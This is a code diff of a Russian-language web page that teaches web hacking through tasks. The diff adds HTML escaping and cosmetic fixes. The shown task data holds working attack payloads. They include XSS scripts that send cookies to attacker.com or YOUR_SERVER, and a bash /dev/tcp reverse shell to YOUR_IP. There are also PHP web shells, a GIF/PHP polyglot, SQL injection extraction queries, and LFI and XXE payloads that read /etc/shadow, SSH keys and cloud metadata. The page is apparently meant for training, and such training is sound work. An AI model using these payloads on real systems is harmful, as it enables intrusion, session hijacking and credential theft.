@@ -24,10 +24,7 @@
             text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
         }
         .subtitle { color: #006619; margin-top: 10px; }
-        .task-list {
-            display: grid;
-            gap: 15px;
-        }
+        .task-list { display: grid; gap: 15px; }
         .task-card {
             background: #111;
             border: 1px solid #222;
@@ -44,25 +41,10 @@
             border-color: #00ff41;
             background: #0a1a0a;
         }
-        .task-number {
-            color: #006619;
-            font-size: 0.85em;
-            text-transform: uppercase;
-        }
-        .task-title {
-            font-size: 1.3em;
-            color: #00ff41;
-            margin: 5px 0;
-        }
-        .task-type {
-            color: #ffaa00;
-            font-size: 0.85em;
-        }
-        .task-difficulty {
-            color: #ff3333;
-            font-size: 0.85em;
-            margin-top: 5px;
-        }
+        .task-number { color: #006619; font-size: 0.85em; text-transform: uppercase; }
+        .task-title { font-size: 1.3em; color: #00ff41; margin: 5px 0; }
+        .task-type { color: #ffaa00; font-size: 0.85em; }
+        .task-difficulty { color: #ff3333; font-size: 0.85em; margin-top: 5px; }
         .modal {
             display: none;
             position: fixed;
@@ -110,6 +92,9 @@
             overflow-x: auto;
             font-size: 0.9em;
             line-height: 1.8;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
         .code-block .comment { color: #006619; }
         .code-block .command { color: #00ff41; }
@@ -131,10 +116,7 @@
             margin: 15px 0;
             border-radius: 4px;
         }
-        .vulnerability-info h4 {
-            color: #ff3333;
-            margin-bottom: 10px;
-        }
+        .vulnerability-info h4 { color: #ff3333; margin-bottom: 10px; }
         .solution-box {
             background: rgba(0, 255, 65, 0.05);
             border: 1px solid #00ff41;
@@ -142,10 +124,7 @@
             margin: 15px 0;
             border-radius: 4px;
         }
-        .solution-box h4 {
-            color: #00ff41;
-            margin-bottom: 10px;
-        }
+        .solution-box h4 { color: #00ff41; margin-bottom: 10px; }
         .real-example {
             background: #1a1a1a;
             border: 1px solid #ffaa00;
@@ -153,14 +132,23 @@
             margin: 15px 0;
             border-radius: 4px;
         }
-        .real-example h4 {
-            color: #ffaa00;
-            margin-bottom: 10px;
-        }
-        ul { margin: 10px 0 10px 30px; }
+        .real-example h4 { color: #ffaa00; margin-bottom: 10px; }
+        ul, ol { margin: 10px 0 10px 30px; }
         li { margin: 5px 0; }
         strong { color: #00ff41; }
         em { color: #ffaa00; }
+        .mark-btn {
+            margin-top: 20px;
+            width: 100%;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: inherit;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        .mark-btn:hover { background: #00ff41; color: #0a0a0a; }
         footer {
             margin-top: 40px;
             padding-top: 20px;
@@ -190,6 +178,17 @@
     </div>
 
     <script>
+        // КРИТИЧНО: функция экранирования HTML
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
         const tasks = [
             {
                 id: 1,
@@ -209,7 +208,7 @@
                 ],
                 realExample: {
                     title: 'Реальный кейс',
-                    content: 'В 2019 году исследователь нашел поддомен dev.target.com с старой версией Jenkins без авторизации. Через RCE получил доступ к production базе данных.'
+                    content: 'В 2019 году исследователь нашел поддомен dev.target.com со старой версией Jenkins без авторизации. Через RCE получил доступ к production базе данных.'
                 },
                 solution: {
                     title: 'Методология',
@@ -277,7 +276,7 @@
                 solution: {
                     title: 'Ручная эксплуатация',
                     steps: [
-                        'Проверь уязвимость: https://target.com/product?id=1\' (ошибка SQL)',
+                        'Проверь уязвимость: добавь одинарную кавычку в параметр id=1\'',
                         'Определи количество колонок: ORDER BY 1, ORDER BY 2, ORDER BY 3... до ошибки',
                         'Найди рабочие колонки: UNION SELECT 1,2,3-- - (смотри что выводится на странице)',
                         'Извлеки данные: UNION SELECT username,password,3 FROM users-- -',
@@ -310,9 +309,9 @@
                     title: 'Boolean-Based Blind',
                     steps: [
                         'Проверь условие: ?id=1 AND 1=1-- - (нормально) vs ?id=1 AND 1=2-- - (другое поведение)',
-                        'Извлекай посимвольно: AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=\'a\'',
+                        'Извлекай посимвольно: AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=a',
                         'Автоматизируй через sqlmap или напиши скрипт на Python',
-                        'Для time-based: AND IF(1=1,SLEEP(5),0)— задержка 5 секунд = true'
+                        'Для time-based: AND IF(1=1,SLEEP(5),0) — задержка 5 секунд = true'
                     ]
                 }
             },
@@ -325,12 +324,12 @@
                 tools: ['burpsuite', 'beef', 'custom payload'],
                 vulnerability: {
                     title: 'Уязвимость',
-                    content: 'Параметр ?search= отражается в странице: <p>Результаты для: TEST</p>. Инъекция: <script>alert(1)</script>'
+                    content: 'Параметр ?search= отражается в странице. Инъекция через script теги позволяет выполнить произвольный JS.'
                 },
                 commands: [
-                    { cmd: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", desc: 'Кража cookie' },
-                    { cmd: "<img src=x onerror='fetch(\"http://attacker.com/?c=\"+document.cookie)'>", desc: 'Альтернативный payload' },
-                    { cmd: "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>", desc: 'Через Image object' }
+                    { cmd: '<script>document.location="http://YOUR_SERVER/?c="+document.cookie</script>', desc: 'Кража cookie через редирект' },
+                    { cmd: '<img src=x onerror="fetch(\'http://YOUR_SERVER/?c=\'+document.cookie)">', desc: 'Альтернативный payload через img' },
+                    { cmd: '<script>new Image().src="http://YOUR_SERVER/?c="+document.cookie</script>', desc: 'Через Image object' }
                 ],
                 realExample: {
                     title: 'Реальный кейс',
@@ -339,12 +338,12 @@
                 solution: {
                     title: 'Эксплуатация',
                     steps: [
-                        'Найди отражающий параметр: ?search=<test>',
+                        'Найди отражающий параметр: ?search=test',
                         'Проверь XSS: ?search=<script>alert(1)</script>',
                         'Создай сервер для приема cookie: python3 -m http.server 8080',
-                        'Используй payload: <script>document.location=\'http://YOUR_IP:8080/?c=\'+document.cookie</script>',
-                        'Закодируй payload для обхода фильтров: URL encoding, HTML entities, JavaScript encoding',
-                        'Отфильтруй admin cookie: if(document.cookie.includes(\'session\')) steal()'
+                        'Используй payload с редиректом на твой сервер',
+                        'Закодируй payload для обхода фильтров: URL encoding, HTML entities',
+                        'Отфильтруй admin cookie: if(document.cookie.includes("session")) steal()'
                     ]
                 }
             },
@@ -360,9 +359,9 @@
                     content: 'Пользовательский ввод сохраняется в БД и выводится без санитизации. Например, поле комментария или имени профиля.'
                 },
                 commands: [
-                    { cmd: "<script>fetch('http://attacker.com/log?c='+document.cookie)</script>", desc: 'Кража cookie всех пользователей' },
-                    { cmd: "<img src=x onerror='this.src=\"http://attacker.com/?ua=\"+navigator.userAgent'>", desc: 'Сбор User-Agent' },
-                    { cmd: "<script>setInterval(()=>fetch('http://attacker.com/?url='+location.href),5000)</script>", desc: 'Мониторинг активности' }
+                    { cmd: '<script>fetch("http://YOUR_SERVER/log?c="+document.cookie)</script>', desc: 'Кража cookie всех пользователей' },
+                    { cmd: '<img src=x onerror="this.src=\'http://YOUR_SERVER/?ua=\'+navigator.userAgent">', desc: 'Сбор User-Agent' },
+                    { cmd: '<script>setInterval(()=>fetch("http://YOUR_SERVER/?url="+location.href),5000)</script>', desc: 'Мониторинг активности' }
                 ],
                 realExample: {
                     title: 'Реальный кейс',
@@ -421,12 +420,12 @@
                 tools: ['burpsuite', 'manual testing', 'liffy'],
                 vulnerability: {
                     title: 'Уязвимость',
-                    content: 'Параметр включает файл: include($_GET[\'page\']). Контроль пути позволяет читать произвольные файлы.'
+                    content: 'Параметр включает файл: include($_GET["page"]). Контроль пути позволяет читать произвольные файлы.'
                 },
                 commands: [
                     { cmd: '?page=../../../../etc/passwd', desc: 'Чтение системного файла' },
                     { cmd: '?page=php://filter/convert.base64-encode/resource=index.php', desc: 'Чтение исходного кода PHP' },
-                    { cmd: '?page=/proc/self/environ', desc: 'Чтение переменных окружения (может содержать секреты)' }
+                    { cmd: '?page=/proc/self/environ', desc: 'Чтение переменных окружения' }
                 ],
                 realExample: {
                     title: 'Реальный кейс',
@@ -436,11 +435,11 @@
                     title: 'Эксплуатация',
                     steps: [
                         'Проверь базовый LFI: ?page=../../../etc/passwd',
-                        'Обходи фильтр добавления расширения: ?page=../../../etc/passwd%00 (null byte, PHP < 5.3)',
+                        'Обходи фильтр добавления расширения: null byte injection (PHP < 5.3)',
                         'Используй PHP wrappers: php://filter, php://input, data://',
                         'Для RCE через LFI: загрузи файл с PHP кодом через upload, потом включи его через LFI',
                         'Читай логи: /var/log/apache2/access.log (вставь PHP код в User-Agent)',
-                        'Ищи чувствительные файлы: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, /var/www/html/config.php'
+                        'Ищи чувствительные файлы: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, конфиги'
                     ]
                 }
             },
@@ -459,7 +458,7 @@
                     { cmd: '; cat /etc/passwd', desc: 'Выполнение команды через ;' },
                     { cmd: '| ls -la', desc: 'Выполнение через pipe' },
                     { cmd: '$(whoami)', desc: 'Command substitution' },
-                    { cmd: '`id`", desc: 'Backtick execution' }
+                    { cmd: '`id`', desc: 'Backtick execution' }
                 ],
                 realExample: {
                     title: 'Реальный кейс',
@@ -470,7 +469,7 @@
                     steps: [
                         'Найди функционал который выполняет команды: ping, nslookup, traceroute, конвертация файлов',
                         'Проверь инъекцию: 127.0.0.1; id или 127.0.0.1|id',
-                        'Если фильтр — пробуй обход: 127.0.0.1%0aid, 127.0.0.1%0a id',
+                        'Если фильтр — пробуй обход: newline injection %0a',
                         'Для обхода blacklist: используй конкатенацию: a=l;b=s;$a$b',
                         'Получи reverse shell: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1',
                         'Escalation: ищи SUID бинарники, sudo права, writable конфиги'
@@ -553,8 +552,8 @@
                     content: 'Загрузка файлов без проверки содержимого, только по расширению. Или проверка только на клиенте (JavaScript).'
                 },
                 commands: [
-                    { cmd: '<?php system($_GET[\'cmd\']); ?>', desc: 'Простой PHP web shell' },
-                    { cmd: 'GIF89a;<?php system($_GET[\'c\']); ?>', desc: 'Polyglot файл (GIF + PHP)' },
+                    { cmd: '<?php system($_GET["cmd"]); ?>', desc: 'Простой PHP web shell' },
+                    { cmd: 'GIF89a;<?php system($_GET["c"]); ?>', desc: 'Polyglot файл (GIF + PHP)' },
                     { cmd: 'shell.php.jpg', desc: 'Double extension обход' },
                     { cmd: 'shell.php%00.jpg', desc: 'Null byte injection (старые PHP)' }
                 ],
@@ -587,9 +586,9 @@
                     content: 'XML парсер обрабатывает внешние сущности без ограничений. Позволяет читать файлы, делать запросы к внутренним сервисам.'
                 },
                 commands: [
-                    { cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', desc: 'Чтение файла через XXE' },
-                    { cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', desc: 'SSRF через XXE (AWS metadata)' },
-                    { cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>', desc: 'Чтение PHP исходников' }
+                    { cmd: '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;', desc: 'Чтение файла через XXE' },
+                    { cmd: '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;', desc: 'SSRF через XXE (AWS metadata)' },
+                    { cmd: '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;', desc: 'Чтение PHP исходников' }
                 ],
                 realExample: {
                     title: 'Реальный кейс',
@@ -603,7 +602,7 @@
                         'Если фильтр — пробуй obfuscation: параметризованные entities, nested entities',
                         'Для blind XXE (нет вывода): используй OOB techniques через HTTP/DNS',
                         'Читай чувствительные файлы: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, конфиги',
-                        'Используй XXE для SSRF: сканируй внутренние порты,アクセス cloud metadata'
+                        'Используй XXE для SSRF: сканируй внутренние порты, cloud metadata'
                     ]
                 }
             },
@@ -679,14 +678,14 @@
             const list = document.getElementById('taskList');
             const completed = JSON.parse(localStorage.getItem('hacking_completed') || '[]');
             
-            list.innerHTML = tasks.map(task => `
-                <div class="task-card ${completed.includes(task.id) ? 'completed' : ''}" onclick="openTask(${task.id})">
-                    <div class="task-number">Задача ${String(task.id).padStart(2, '0')}</div>
-                    <div class="task-title">${task.title}</div>
-                    <div class="task-type">${task.type}</div>
-                    <div class="task-difficulty">${task.difficulty}</div>
-                </div>
-            `).join('');
+            list.innerHTML = tasks.map(task => 
+                '<div class="task-card ' + (completed.indexOf(task.id) !== -1 ? 'completed' : '') + '" onclick="openTask(' + task.id + ')">' +
+                    '<div class="task-number">Задача ' + (task.id < 10 ? '0' : '') + task.id + '</div>' +
+                    '<div class="task-title">' + escapeHtml(task.title) + '</div>' +
+                    '<div class="task-type">' + escapeHtml(task.type) + '</div>' +
+                    '<div class="task-difficulty">' + escapeHtml(task.difficulty) + '</div>' +
+                '</div>'
+            ).join('');
         }
 
         function openTask(id) {
@@ -694,51 +693,52 @@
             const modal = document.getElementById('modal');
             const content = document.getElementById('modalContent');
             
-            content.innerHTML = `
-                <button class="close-btn" onclick="closeModal()">×</button>
-                <h2 style="color:#00ff41;margin-bottom:10px;">${task.title}</h2>
-                <div style="color:#ffaa00;margin-bottom:20px;">${task.type} // ${task.difficulty}</div>
-                
-                <div class="section">
-                    <div class="section-title">Описание</div>
-                    <p>${task.description}</p>
-                </div>
-
-                <div class="vulnerability-info">
-                    <h4>${task.vulnerability.title}</h4>
-                    <p>${task.vulnerability.content}</p>
-                </div>
-
-                <div class="section">
-                    <div class="section-title">Инструменты</div>
-                    <div>${task.tools.map(t => `<span class="tool-tag">${t}</span>`).join('')}</div>
-                </div>
-
-                <div class="section">
-                    <div class="section-title">Команды и Payloads</div>
-                    ${task.commands.map(cmd => `
-                        <div class="code-block">
-                            <div class="command">$ ${cmd.cmd}</div>
-                            <div class="comment"># ${cmd.desc}</div>
-                        </div>
-                    `).join('')}
-                </div>
-
-                <div class="real-example">
-                    <h4>${task.realExample.title}</h4>
-                    <p>${task.realExample.content}</p>
-                </div>
-
-                <div class="solution-box">
-                    <h4>${task.solution.title}</h4>
-                    <ol>
-                        ${task.solution.steps.map(step => `<li>${step}</li>`).join('')}
-                    </ol>
-                </div>
-
-                <button onclick="markComplete(${task.id})" style="margin-top:20px;width:100%;padding:15px;">Отметить как выполненное</button>
-            `;
+            let html = '<button class="close-btn" onclick="closeModal()">×</button>';
+            html += '<h2 style="color:#00ff41;margin-bottom:10px;">' + escapeHtml(task.title) + '</h2>';
+            html += '<div style="color:#ffaa00;margin-bottom:20px;">' + escapeHtml(task.type) + ' // ' + escapeHtml(task.difficulty) + '</div>';
             
+            html += '<div class="section">';
+            html += '<div class="section-title">Описание</div>';
+            html += '<p>' + escapeHtml(task.description) + '</p>';
+            html += '</div>';
+
+            html += '<div class="vulnerability-info">';
+            html += '<h4>' + escapeHtml(task.vulnerability.title) + '</h4>';
+            html += '<p>' + escapeHtml(task.vulnerability.content) + '</p>';
+            html += '</div>';
+
+            html += '<div class="section">';
+            html += '<div class="section-title">Инструменты</div>';
+            html += '<div>' + task.tools.map(t => '<span class="tool-tag">' + escapeHtml(t) + '</span>').join('') + '</div>';
+            html += '</div>';
+
+            html += '<div class="section">';
+            html += '<div class="section-title">Команды и Payloads</div>';
+            task.commands.forEach(cmd => {
+                html += '<div class="code-block">';
+                html += '<div class="command">$ ' + escapeHtml(cmd.cmd) + '</div>';
+                html += '<div class="comment"># ' + escapeHtml(cmd.desc) + '</div>';
+                html += '</div>';
+            });
+            html += '</div>';
+
+            html += '<div class="real-example">';
+            html += '<h4>' + escapeHtml(task.realExample.title) + '</h4>';
+            html += '<p>' + escapeHtml(task.realExample.content) + '</p>';
+            html += '</div>';
+
+            html += '<div class="solution-box">';
+            html += '<h4>' + escapeHtml(task.solution.title) + '</h4>';
+            html += '<ol>';
+            task.solution.steps.forEach(step => {
+                html += '<li>' + escapeHtml(step) + '</li>';
+            });
+            html += '</ol>';
+            html += '</div>';
+
+            html += '<button class="mark-btn" onclick="markComplete(' + task.id + ')">Отметить как выполненное</button>';
+            
+            content.innerHTML = html;
             modal.classList.add('active');
         }
 
@@ -748,7 +748,7 @@
 
         function markComplete(id) {
             let completed = JSON.parse(localStorage.getItem('hacking_completed') || '[]');
-            if (!completed.includes(id)) {
+            if (completed.indexOf(id) === -1) {
                 completed.push(id);
                 localStorage.setItem('hacking_completed', JSON.stringify(completed));
             }
@@ -756,7 +756,7 @@
             renderTasks();
         }
 
-        document.getElementById('modal').addEventListener('click', (e) => {
+        document.getElementById('modal').addEventListener('click', function(e) {
             if (e.target.id === 'modal') closeModal();
         });
 
